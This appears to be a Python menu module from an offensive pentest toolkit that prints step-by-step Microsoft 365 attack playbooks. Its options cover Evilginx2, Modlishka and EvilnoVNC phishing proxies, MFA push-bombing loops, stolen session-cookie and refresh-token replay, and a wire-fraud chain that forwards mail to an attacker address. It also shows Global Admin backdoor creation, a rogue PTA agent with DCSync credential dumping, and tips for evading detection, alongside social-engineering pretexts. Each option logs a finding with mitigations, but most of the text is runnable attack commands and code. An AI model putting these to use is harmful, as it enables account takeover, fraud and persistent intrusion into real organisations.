"""
Module: AiTM Phishing & MFA Bypass
Techniques: Adversary-in-the-Middle reverse proxy (Evilginx2, Modlishka, EvilnoVNC),
            MFA fatigue / push bombing, session cookie theft & replay,
            OAuth token abuse, CAP bypass, AiTM → lateral movement chain
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("AiTM / MFA BYPASS", "Adversary-in-the-Middle · Session Hijack · Push Fatigue")
    aad    = prompt("Azure AD / M365 tenant domain (e.g. corp.com)")
    target = prompt("Target user email (e.g. victim@corp.com)")
    attacker = prompt("Attacker public IP / domain (for phishing infra)")

    print(f"""
  {C}── AiTM PROXY SETUP ────────────────────────────────────────────────{RST}
  [1]  Evilginx2              (reverse proxy — steals session cookies)
  [2]  Modlishka              (alternative AiTM proxy)
  [3]  EvilnoVNC              (browser-in-browser — bypasses hardware MFA)
  {C}── MFA FATIGUE ATTACKS ──────────────────────────────────────────────{RST}
  [4]  MFA Push Bombing       (flood victim with Authenticator requests)
  [5]  MFA Fatigue via Spray  (timed low-and-slow push flood)
  {C}── SESSION COOKIE ABUSE ────────────────────────────────────────────{RST}
  [6]  Cookie Extraction & Replay  (use stolen session cookie)
  [7]  Token Persistence      (refresh token → permanent access)
  {C}── POST-AiTM CHAINS ────────────────────────────────────────────────{RST}
  [8]  AiTM → BEC Setup       (inbox rule · forward · impersonate)
  [9]  AiTM → Azure Backdoor  (new MFA method · app registration)
  [10] AiTM → On-Prem Pivot   (hybrid identity token → AD access)
  {C}── DETECTION NOTES ─────────────────────────────────────────────────{RST}
  [11] AiTM OpSec & Detection Evasion
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Evilginx2 ────────────────────────────────────────────────────────────
    if c == "1":
        phishlet = prompt("Phishlet name (e.g. o365, microsoft, outlook)") or "o365"
        redirect = prompt("Redirect URL after victim logs in") or f"https://{aad}"
        print(f"""
  {C}Evilginx2 — Reverse Proxy AiTM Setup:{RST}

  {DIM}Evilginx2 sits between victim and Microsoft login.
  Victim authenticates for real → Evilginx captures session cookies.
  MFA is completed by the REAL Microsoft server — Evilginx just intercepts.{RST}

  ── Step 1: Install & configure Evilginx2 ────────────────────────────
  git clone https://github.com/kgretzky/evilginx2
  cd evilginx2 && go build
  sudo ./evilginx2 -p ./phishlets

  ── Step 2: DNS setup (on attacker VPS) ──────────────────────────────
  # Add A record: *.{aad.split('.')[0]}-login.com → {attacker}
  # Add A record: {aad.split('.')[0]}-login.com → {attacker}
  # Evilginx handles TLS automatically (Let's Encrypt)

  ── Step 3: Configure in Evilginx2 shell ──────────────────────────────
  config domain {aad.split('.')[0]}-login.com
  config ipv4 {attacker}
  phishlets hostname {phishlet} login.{aad.split('.')[0]}-login.com
  phishlets enable {phishlet}
  lures create {phishlet}
  lures redirect {phishlet} 0 {redirect}
  lures get-url 0

  ── Step 4: Send phishing link to {target} ───────────────────────────
  # Victim clicks link → logs in (MFA passes) → session captured
  # Evilginx shows captured sessions:
  sessions
  sessions <id>

  ── Step 5: Export & use captured cookie ─────────────────────────────
  # Copy "session_token" cookie value from Evilginx output
  # Import into browser via Cookie Editor extension or Burp

  {Y}Verify session works:{RST}
  curl -c /tmp/cookies.txt -b "cookie_name=<captured_value>" \\
    https://outlook.office.com/mail/

  {DIM}Tip: Use a lookalike domain (IDN homograph, typosquat) to increase trust.
  Combine with pretexting email: "Your MFA device is expiring — re-register"{RST}
""")
        add_finding("AiTM Phishing via Evilginx2", "Critical",
                    f"Reverse proxy AiTM intercepts session cookies for {target} on {aad}",
                    "Enable token binding; deploy FIDO2/passkeys (phishing-resistant MFA); use Microsoft Entra ID Protection sign-in risk policies")

    # ── [2] Modlishka ────────────────────────────────────────────────────────────
    elif c == "2":
        print(f"""
  {C}Modlishka — Alternative AiTM Reverse Proxy:{RST}

  {DIM}Modlishka proxies any site without phishlet configuration.
  Slightly harder to detect than Evilginx due to different traffic patterns.{RST}

  ── Install ────────────────────────────────────────────────────────────
  git clone https://github.com/drk1wi/Modlishka
  cd Modlishka && go build -o modlishka main.go

  ── Basic M365 config ──────────────────────────────────────────────────
  cat > /tmp/modlishka_m365.json << 'EOF'
  {{
    "proxyDomain": "login.{aad.split('.')[0]}-secure.com",
    "listeningAddress": "0.0.0.0",
    "target": "login.microsoftonline.com",
    "targetRes": "microsoftonline.com,office.com,live.com",
    "terminateTriggers": "",
    "terminateRedirectUrl": "https://{aad}",
    "trackingCookie": "id",
    "trackingParam": "track",
    "log": "/tmp/modlishka_creds.log",
    "listeningPort": "443",
    "certKey": "/etc/letsencrypt/live/login.{aad.split('.')[0]}-secure.com/privkey.pem",
    "certPool": "/etc/letsencrypt/live/login.{aad.split('.')[0]}-secure.com/fullchain.pem"
  }}
  EOF

  sudo ./modlishka -config /tmp/modlishka_m365.json

  ── Monitor credentials & cookies ─────────────────────────────────────
  tail -f /tmp/modlishka_creds.log
  # Look for POST requests containing credential + session cookie
""")
        add_finding("AiTM Phishing via Modlishka", "Critical",
                    f"Modlishka reverse proxy targeting {aad} M365 login page",
                    "Enforce FIDO2 hardware keys; Conditional Access require compliant device; monitor sign-in from unexpected IP ranges")

    # ── [3] EvilnoVNC ────────────────────────────────────────────────────────────
    elif c == "3":
        print(f"""
  {C}EvilnoVNC — Browser-in-Browser AiTM (bypasses hardware MFA):{RST}

  {DIM}EvilnoVNC runs a real browser on the attacker server inside noVNC.
  Victim sees a real browser (not a proxy) — hardware tokens still work!
  Works against FIDO2/WebAuthn because the REAL browser completes the flow.{RST}

  ── Install & Setup ────────────────────────────────────────────────────
  git clone https://github.com/fkasler/evilnovnc
  cd evilnovnc
  pip3 install -r requirements.txt
  npm install

  ── Configure ──────────────────────────────────────────────────────────
  # Edit config.json:
  {{
    "target_url":  "https://login.microsoftonline.com/",
    "listen_port": 6080,
    "vnc_port":    5900,
    "cookie_domains": [".microsoft.com", ".office.com", ".live.com"]
  }}

  ── Launch ─────────────────────────────────────────────────────────────
  sudo python3 evilnomad.py --target https://login.microsoftonline.com \\
    --listen 0.0.0.0:6080 \\
    --cookie-output /tmp/stolen_cookies.json

  ── Send victim link ───────────────────────────────────────────────────
  http://{attacker}:6080/vnc.html
  # Victim sees a "browser" — logs in normally — session captured

  ── Replay captured session ────────────────────────────────────────────
  python3 cookie_replay.py --cookies /tmp/stolen_cookies.json \\
    --url https://outlook.office.com/mail/

  {Y}Proxy-aware import (Selenium):{RST}
  from selenium import webdriver
  opts = webdriver.ChromeOptions()
  # Load cookies from /tmp/stolen_cookies.json
  # Navigate to M365 — bypasses re-auth

  {DIM}EvilnoVNC is the only reliable method against FIDO2/Passkey MFA.
  Requires social engineering the victim to interact with the "login page."{RST}
""")
        add_finding("EvilnoVNC Browser-in-Browser AiTM", "Critical",
                    f"Browser-in-Browser attack bypasses FIDO2/hardware MFA for {target}",
                    "User awareness training; monitor for VNC-based session activity; implement Microsoft Entra ID Verified ID for strong identity binding")

    # ── [4] MFA Push Bombing ──────────────────────────────────────────────────────
    elif c == "4":
        print(f"""
  {C}MFA Push Bombing / Fatigue Attack:{RST}

  {DIM}Attacker knows valid credentials (from breach/spray/phishing).
  Continuously logs in → triggers Authenticator push notifications.
  Victim approves out of confusion/frustration → attacker gains access.{RST}

  ── Spray tool + push flood ────────────────────────────────────────────
  {Y}MFASweep — check MFA enforcement per protocol:{RST}
  Import-Module MFASweep
  Invoke-MFASweep -Username {target} -Password '<password>' -Recon

  {Y}Spray with push trigger (MSOLSpray):{RST}
  python3 MSOLSpray.py --userlist users.txt --password '<password>' \\
    --url https://login.microsoftonline.com/{aad}

  {Y}roadtx — continuous token request (triggers push loop):{RST}
  for i in $(seq 1 50); do
    roadtx auth -t {aad} -u {target} -p '<password>' 2>/dev/null
    sleep 3
  done

  {Y}AADInternals push flood:{RST}
  Import-Module AADInternals
  while ($true) {{
    try {{ Get-AADIntAccessTokenForMSGraph -Credentials (Get-Credential) }} catch {{}}
    Start-Sleep -Seconds 5
  }}

  {Y}FireProx (rotate source IPs to avoid lockout):{RST}
  python3 fireprox.py --create --api_url https://login.microsoftonline.com
  # Use returned API Gateway URL for spraying

  ── After victim approves ──────────────────────────────────────────────
  # Capture session with Evilginx or roadtx token grab
  roadtx auth -t {aad} -u {target} -p '<password>'
  # → Access + Refresh token stored in ~/.config/roadtx/

  {DIM}Best time: early morning / late at night when victim is less alert.
  Use social engineering pretext: "IT Security notification — approve to continue."{RST}
""")
        add_finding("MFA Push Bombing / Fatigue", "High",
                    f"Continuous MFA push notifications sent to {target} to force approval",
                    "Enable number matching in Microsoft Authenticator; enforce 'Additional context' for push; set sign-in frequency limits")

    # ── [5] MFA Fatigue via Low-and-Slow ─────────────────────────────────────────
    elif c == "5":
        interval = prompt("Interval between push attempts (seconds, default=60)") or "60"
        print(f"""
  {C}MFA Fatigue — Low-and-Slow (stealthy push flood):{RST}

  {DIM}Spread push requests over hours/days to avoid detection.
  User receives 1 push every {interval}s — less obvious than rapid bombing.{RST}

  ── Automated slow spray ───────────────────────────────────────────────
  cat > /tmp/mfa_slow.sh << 'SCRIPT'
  #!/bin/bash
  USER="{target}"
  PASS="$1"
  TENANT="{aad}"

  while true; do
    curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \\
      -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \\
      -d "scope=openid profile" \\
      -d "grant_type=password" \\
      -d "username=$USER" \\
      -d "password=$PASS" \\
      -o /tmp/response.json 2>/dev/null

    # Check if MFA was bypassed (access_token present)
    if grep -q "access_token" /tmp/response.json; then
      echo "[+] MFA APPROVED! Token captured."
      cat /tmp/response.json
      break
    fi
    echo "[*] Push sent... waiting {interval}s"
    sleep {interval}
  done
  SCRIPT
  chmod +x /tmp/mfa_slow.sh
  /tmp/mfa_slow.sh '<known_password>'

  {Y}With roadtx (more reliable token handling):{RST}
  while true; do
    result=$(roadtx auth -t {aad} -u {target} -p '<password>' 2>&1)
    if echo "$result" | grep -q "access_token"; then
      echo "[+] Token captured!"
      break
    fi
    sleep {interval}
  done

  {DIM}Combine with social pretext email:
  "Our system detected unusual login — you will receive security verification push.
  This is normal — please approve to confirm your identity." {RST}
""")
        add_finding("MFA Fatigue (Low-and-Slow)", "High",
                    f"Slow-paced MFA push bombardment targeting {target} over extended period",
                    "Enable number matching; set MFA push fraud alert; use Entra ID Identity Protection risky sign-in policy")

    # ── [6] Cookie Extraction & Replay ───────────────────────────────────────────
    elif c == "6":
        print(f"""
  {C}Session Cookie Theft & Replay:{RST}

  {DIM}After AiTM success, captured cookies allow authenticated access
  without credentials or MFA — session is already established.{RST}

  ── Cookie formats ────────────────────────────────────────────────────
  {Y}Key cookies to steal from M365 / Entra ID:{RST}
  ESTSAUTH      → persistent Entra ID session
  ESTSAUTHPERSISTENT → long-lived (90 days) session
  OIDCAuth      → OIDC session for M365 apps
  x-ms-refreshtokencredential → refresh token credential

  ── Import into browser ────────────────────────────────────────────────
  # Firefox: Cookie Editor extension → Import JSON
  # Chrome: EditThisCookie extension → Import

  {Y}Cookie JSON format:{RST}
  [
    {{
      "name": "ESTSAUTHPERSISTENT",
      "value": "<stolen_value>",
      "domain": ".login.microsoftonline.com",
      "path": "/",
      "secure": true,
      "httpOnly": true
    }}
  ]

  ── Replay with curl ───────────────────────────────────────────────────
  # Test Outlook access:
  curl -b "ESTSAUTHPERSISTENT=<value>" \\
    -L https://outlook.office.com/mail/ \\
    -D /tmp/response_headers.txt

  # Test Graph API access:
  curl -b "ESTSAUTH=<value>" \\
    https://graph.microsoft.com/v1.0/me

  ── Extract refresh token from cookie (roadtx) ────────────────────────
  roadtx describe --cookie 'ESTSAUTHPERSISTENT=<value>'
  roadtx auth --cookie '<value>' -t {aad}
  # → Converts session cookie to access + refresh token

  ── Python replay (requests) ──────────────────────────────────────────
  import requests
  s = requests.Session()
  s.cookies.set("ESTSAUTHPERSISTENT", "<stolen_value>",
                domain=".login.microsoftonline.com")
  r = s.get("https://graph.microsoft.com/v1.0/me")
  print(r.json())

  {DIM}ESTSAUTHPERSISTENT is valid for up to 90 days on persistent sessions.
  Entra ID sign-in logs show this as a known/trusted device.{RST}
""")
        add_finding("Session Cookie Theft & Replay", "Critical",
                    f"Stolen ESTSAUTH/ESTSAUTHPERSISTENT cookie replayed to access {aad} M365 services",
                    "Implement Continuous Access Evaluation (CAE); revoke sessions via Entra ID; enforce compliant device policy; reduce session lifetime")

    # ── [7] Token Persistence ─────────────────────────────────────────────────────
    elif c == "7":
        print(f"""
  {C}Refresh Token Abuse — Long-Term Persistence:{RST}

  {DIM}Refresh tokens (from AiTM or device code phishing) can generate
  new access tokens indefinitely — no MFA re-prompt unless revoked.{RST}

  ── Use captured refresh token ────────────────────────────────────────
  {Y}roadtx refresh token → access token:{RST}
  roadtx auth -t {aad} --refresh-token '<refresh_token>'
  roadtx listscopes   # see what scopes are available

  {Y}ROADtools — exchange for all scopes:{RST}
  roadtx gettokens -t {aad} -r '<refresh_token>'
  roadtx describe     # dump all token contents

  {Y}TokenTacticsV2 (PowerShell):{RST}
  Import-Module TokenTactics
  $tokens = RefreshTo-MSGraphToken -domain {aad} -refreshToken '<refresh_token>'
  $tokens.access_token

  ── Generate tokens for specific resources ────────────────────────────
  # Microsoft Graph:
  roadtx auth -t {aad} -r 'https://graph.microsoft.com' \\
    --refresh-token '<token>'

  # SharePoint:
  roadtx auth -t {aad} -r 'https://{aad.split('.')[0]}.sharepoint.com' \\
    --refresh-token '<token>'

  # Exchange Online:
  roadtx auth -t {aad} -r 'https://outlook.office.com' \\
    --refresh-token '<token>'

  ── Backdoor: Register persistent app with refresh token ──────────────
  {Y}Add app role for permanent access (requires GA token):{RST}
  python3 -c "
  import requests, json
  hdrs = {{'Authorization': 'Bearer <ga_access_token>'}}
  # Create app registration
  app = requests.post('https://graph.microsoft.com/v1.0/applications',
    headers=hdrs, json={{'displayName': 'DiagnosticsConnector'}}).json()
  # Add secret
  secret = requests.post(f'https://graph.microsoft.com/v1.0/applications/{{app[\"id\"]}}/addPassword',
    headers=hdrs, json={{'passwordCredential': {{'displayName': 'key1'}}}}).json()
  print('AppID:', app['appId'], 'Secret:', secret['secretText'])
  "
  # Use appId+secret as persistent access — survives password reset

  {DIM}Refresh tokens persist until:
  - User revokes sessions (Entra ID portal)
  - Admin runs Revoke-AzureADUserAllRefreshToken
  - Token lifetime policy expires (default 90 days for persistent sessions){RST}
""")
        add_finding("Refresh Token Persistence", "Critical",
                    f"Long-lived refresh token obtained for {target} on {aad} — persistent access without MFA",
                    "Revoke all refresh tokens via Entra ID; implement token lifetime policies; enable Continuous Access Evaluation; audit app registrations")

    # ── [8] AiTM → BEC ───────────────────────────────────────────────────────────
    elif c == "8":
        print(f"""
  {C}AiTM → Business Email Compromise (BEC) Chain:{RST}

  {DIM}After session hijack: read emails, set forward rules, impersonate for fraud.{RST}

  ── Step 1: Read mailbox ──────────────────────────────────────────────
  {Y}Graph API — list recent emails:{RST}
  curl -H "Authorization: Bearer <access_token>" \\
    "https://graph.microsoft.com/v1.0/users/{target}/messages?\\$top=50" \\
    | python3 -m json.tool | grep -E '"subject"|"from"|"body"'

  {Y}MailSniper (PowerShell):{RST}
  Import-Module MailSniper
  Get-GlobalAddressList -ExchHostname outlook.office365.com \\
    -UserName {target} -Password '<pass>' -OutFile /tmp/gal.txt
  Get-GlobalAddressList -AccessToken '<token>' -OutFile /tmp/gal.txt

  ── Step 2: Create inbox forwarding rule ──────────────────────────────
  {Y}Graph API — create forward rule (stealthy, hides in inbox rules):{RST}
  curl -X POST -H "Authorization: Bearer <access_token>" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \\
    -d '{{
      "displayName": "MoveToArchive",
      "sequence": 1,
      "isEnabled": true,
      "conditions": {{"bodyOrSubjectContains": []}},
      "actions": {{
        "forwardTo": [{{"emailAddress": {{"address": "attacker@burner.com"}}}}],
        "stopProcessingRules": false
      }}
    }}'

  ── Step 3: Search for high-value content ─────────────────────────────
  {Y}Search for sensitive emails:{RST}
  curl -H "Authorization: Bearer <token>" \\
    "https://graph.microsoft.com/v1.0/me/messages?\\$search=\\"invoice OR wire OR payment OR transfer\\""

  ── Step 4: Reply impersonation (wire fraud) ──────────────────────────
  {Y}Send email as victim:{RST}
  curl -X POST -H "Authorization: Bearer <token>" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/me/sendMail" \\
    -d '{{
      "message": {{
        "subject": "Re: Invoice #4892",
        "body": {{"contentType": "HTML", "content": "Please update bank details..."}},
        "toRecipients": [{{"emailAddress": {{"address": "finance@victim-partner.com"}}}}]
      }}
    }}'

  {DIM}Target finance/executive mailboxes for maximum BEC impact.
  Evidence: Entra ID sign-in logs show legitimate session — hard to distinguish.{RST}
""")
        add_finding("AiTM → BEC Attack Chain", "Critical",
                    f"Hijacked session of {target} used for mailbox access, rule creation and impersonation",
                    "Monitor Graph API mailbox rule creation; enable Microsoft Defender for Office 365 BEC detection; alert on forwarding rules to external addresses")

    # ── [9] AiTM → Azure Backdoor ────────────────────────────────────────────────
    elif c == "9":
        print(f"""
  {C}AiTM → Azure Backdoor (New MFA Method / App Registration):{RST}

  {DIM}With GA token from AiTM: add backdoor MFA, create admin service principal,
  or modify Conditional Access to permanently allow attacker access.{RST}

  ── Add backdoor MFA method to victim account ────────────────────────
  {Y}Register attacker-controlled phone for MFA:{RST}
  curl -X POST -H "Authorization: Bearer <ga_token>" \\
    "https://graph.microsoft.com/v1.0/users/{target}/authentication/phoneMethods" \\
    -H "Content-Type: application/json" \\
    -d '{{"phoneNumber": "+1-555-ATTACKER", "phoneType": "mobile"}}'

  {Y}Register TOTP authenticator app (AADInternals):{RST}
  Import-Module AADInternals
  Add-AADIntAuthenticatorApp -AccessToken '<ga_token>' \\
    -UserPrincipalName {target}

  ── Create backdoor Global Admin service principal ────────────────────
  {Y}New app + GA role (Python):{RST}
  import requests
  h = {{"Authorization": "Bearer <ga_token>", "Content-Type": "application/json"}}
  # Create app
  app = requests.post("https://graph.microsoft.com/v1.0/applications",
    headers=h, json={{"displayName": "AzureMonitorConnector"}}).json()
  # Create service principal
  sp = requests.post("https://graph.microsoft.com/v1.0/servicePrincipals",
    headers=h, json={{"appId": app["appId"]}}).json()
  # Add GA role
  ga_role_id = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator
  requests.post(f"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments",
    headers=h, json={{
      "roleDefinitionId": ga_role_id,
      "principalId": sp["id"],
      "directoryScopeId": "/"
    }})

  ── Weaken Conditional Access Policy ─────────────────────────────────
  {Y}Add attacker IP to named location (trusted / exempt from MFA):{RST}
  curl -X POST -H "Authorization: Bearer <ga_token>" \\
    "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations" \\
    -H "Content-Type: application/json" \\
    -d '{{
      "displayName": "CorpVPN",
      "isTrusted": true,
      "@odata.type": "#microsoft.graph.ipNamedLocation",
      "ipRanges": [{{"@odata.type": "#microsoft.graph.iPv4CidrRange", "cidrAddress": "{attacker}/32"}}]
    }}'

  {DIM}With GA role: attacker can reset any user password, disable MFA, exfiltrate data.
  Persistent even after victim's own password is changed.{RST}
""")
        add_finding("AiTM → Azure Tenant Backdoor", "Critical",
                    f"Global Admin access via AiTM used to plant persistent backdoor in {aad}",
                    "Monitor privileged role assignments; alert on new MFA method registration; review named location changes in CA policies; use PIM for GA access")

    # ── [10] AiTM → On-Prem Pivot ─────────────────────────────────────────────────
    elif c == "10":
        dc = input_or_session("dc_ip", "On-prem DC IP")
        print(f"""
  {C}AiTM → On-Prem AD Pivot (Hybrid Identity):{RST}

  {DIM}Hybrid joined environments: cloud token → on-prem AD access.
  PRT (Primary Refresh Token) allows SSO to on-prem resources.{RST}

  ── Step 1: Get PRT from captured session ────────────────────────────
  {Y}roadtx — extract PRT:{RST}
  roadtx prt -t {aad} --access-token '<access_token>'
  roadtx describe --prt '<prt_value>'

  {Y}ROADtoken — PRT to access token for on-prem:{RST}
  roadtx auth -t {aad} --prt '<prt>' \\
    -r 'https://management.azure.com'

  ── Step 2: Use PRT for on-prem SSO ──────────────────────────────────
  {Y}AADInternals — get on-prem credentials via PRT:{RST}
  Import-Module AADInternals
  # Get access token for Graph using PRT
  $prtToken = Get-AADIntAccessTokenFromPRTByCookies -PRTCookie '<prt>'
  # Pivot to on-prem via AADConnect / PTA
  Get-AADIntSyncCredentials -AccessToken $prtToken

  ── Step 3: PTA (Pass-Through Authentication) abuse ──────────────────
  {Y}If PTA is configured — authenticate on-prem via cloud:{RST}
  Import-Module AADInternals
  # Install rogue PTA agent (requires GA):
  Install-AADIntPTASpy
  # All on-prem authentications now logged in cleartext
  Get-AADIntPTASpyLog -DecryptPasswords

  ── Step 4: AADConnect credential extraction ──────────────────────────
  {Y}Extract AADConnect MSOL account credentials (on MSOL server):{RST}
  Import-Module AADInternals
  Get-AADIntSyncCredentials     # extracts MSOL$_* account NT hash
  # MSOL account has DCSync rights → full domain dump

  impacket-secretsdump '{aad.split('.')[0]}/MSOL_account@{dc}' \\
    -hashes :<nt_hash> -just-dc-ntlm

  {DIM}Cloud → on-prem pivot works when:
  - Hybrid Azure AD Join is configured
  - Pass-Through Authentication (PTA) is used (not PHS)
  - AADConnect server is reachable from cloud-compromised context{RST}
""")
        add_finding("AiTM → On-Prem Pivot via Hybrid Identity", "Critical",
                    f"Cloud session abused PRT/PTA to pivot to on-prem AD {dc}",
                    "Isolate AADConnect server; restrict PTA agent installation; enable Entra ID Identity Protection; monitor MSOL account DCSync usage")

    # ── [11] OpSec & Detection Evasion ───────────────────────────────────────────
    elif c == "11":
        print(f"""
  {C}AiTM OpSec — Detection Evasion Notes:{RST}

  {Y}What Microsoft Entra ID logs (Unified Audit Log / Sign-in Logs):{RST}
  - Sign-in from new IP / country          → Risk: Medium
  - Sign-in from anonymizing proxy/VPN     → Risk: High
  - Token replay from different IP         → Risk: High (CAE catches this)
  - New MFA method registered              → Alert in Entra ID logs
  - Role assignment changes                → Alert in Entra ID audit logs

  {Y}Evasion techniques:{RST}

  1. {C}Use residential proxy / same-country IP:{RST}
     # Use victim's approximate geolocation for session replay
     # Services: BrightData, Oxylabs residential proxies
     proxychains curl -b "ESTSAUTH=<value>" https://graph.microsoft.com/v1.0/me

  2. {C}Match victim's User-Agent:{RST}
     # Copy exact User-Agent from Evilginx captured headers
     curl -b "<cookies>" -A "<victim_UA>" https://outlook.office.com

  3. {C}Use Continuous Access Evaluation (CAE) aware tools:{RST}
     # Avoid triggering CAE: don't change IP drastically, don't change client
     # CAE revokes tokens within 15 min of policy change

  4. {C}Avoid UEBA triggers:{RST}
     # Don't download bulk data immediately — blend in
     # Access in victim's normal timezone/hours
     # Read emails gradually, not mass export

  5. {C}Phishing infrastructure:{RST}
     # Use aged domains (>6 months), valid TLS cert
     # Avoid bullet-proof hosting — use cloud VPS (AWS/GCP/Azure)
     # Microsoft categorizes new domains → use parked domain with history

  {Y}Detection signatures to be aware of:{RST}
  - Microsoft Defender for Cloud Apps: impossible travel
  - Entra ID Identity Protection: anonymous IP sign-in
  - Microsoft Sentinel: AiTM phishing workbook (AADSignInEventsBeta)
  - MDA alert: "Suspicious inbox manipulation rule"

  {Y}Check if CAE is enforced on tenant:{RST}
  curl -H "Authorization: Bearer <token>" \\
    "https://graph.microsoft.com/v1.0/policies/authenticationStrengthPolicies"
""")

    pause()
